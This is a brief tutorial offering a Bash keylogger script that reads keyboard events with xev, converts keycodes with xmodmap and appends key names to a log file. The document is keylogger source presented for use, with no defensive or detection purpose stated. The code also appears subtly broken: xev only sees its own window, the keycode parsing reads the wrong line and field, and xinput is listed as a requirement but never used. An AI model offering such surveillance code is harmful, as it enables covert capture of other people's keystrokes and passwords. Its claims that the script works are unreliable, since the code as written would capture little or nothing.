# Basic Keylogger in Bash

This document provides a basic example of a keylogger implemented in Bash using `xev` and `xinput` on a Linux system. The script captures and logs keystrokes to a file.

## Requirements

1. **Linux System with X11:** This script is designed for systems running the X Window System.
2. **xinput and xev:** These tools are typically pre-installed on many Linux distributions. If not, you can install them using your package manager.

## Keylogger Script

Save the following script as `keylogger.sh`:

```sh
#!/bin/bash

# Log file to save the captured keystrokes
log_file="keylog.txt"

# Function to log key events
log_key_events() {
    # Use xev to capture key events
    xev -event keyboard | while read -r line; do
        # Extract key press events
        if echo "$line" | grep -q "KeyPress"; then
            # Extract keycode and convert to keyname
            keycode=$(echo "$line" | grep "keycode" | awk '{print $6}')
            keyname=$(xmodmap -pk | grep "^$keycode" | awk '{print $4}')
            if [[ -n "$keyname" ]]; then
                echo "$keyname" >> "$log_file"
            fi
        fi
    done
}

# Run the key event logging function
log_key_events
